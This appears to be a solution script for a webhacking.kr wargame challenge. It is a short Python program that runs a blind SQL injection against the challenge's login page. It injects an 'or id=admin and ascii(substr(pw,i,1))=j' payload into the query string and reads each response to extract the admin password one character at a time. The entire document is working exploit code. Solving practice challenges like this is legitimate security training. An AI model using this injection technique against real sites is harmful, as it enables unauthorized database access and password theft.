import requests

url='https://webhacking.kr/challenge/bonus-1/index.php?id=admin&'

pw=""
for i in range(1,37):
    for j in range(33,127):
        query = "pw='+or+id='admin'+and+ascii(substr(pw,{},1))={}+%23".format(i,j)
        result = requests.get(url+query)
        if "wrong password" in result.text:
            print("pw:" ,pw)
            pw += chr(j)
            break

print(pw)